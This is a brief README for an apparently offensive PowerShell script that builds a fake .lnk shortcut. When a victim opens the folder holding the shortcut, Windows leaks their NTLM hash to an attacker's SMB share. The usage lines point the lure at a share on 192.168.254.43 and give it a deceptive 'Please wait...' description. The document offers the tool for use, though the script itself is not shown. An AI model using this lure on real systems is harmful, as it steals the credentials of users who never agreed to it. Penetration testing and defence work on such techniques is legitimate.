## About
The script creates a fake `.lnk` file that will leak the NTLM hash once the directory is opened (Responder-like attacks)

## Syntax
1) Import the script

`. .\leak.ps1`

2) Create a `.lnk` file

`Create-SMBHashLeakLnk -LnkFilePath ".\grab.lnk"  -SmbSharePath "\\192.168.254.43\share\hunt.exe"  -Description "Please wait..."`
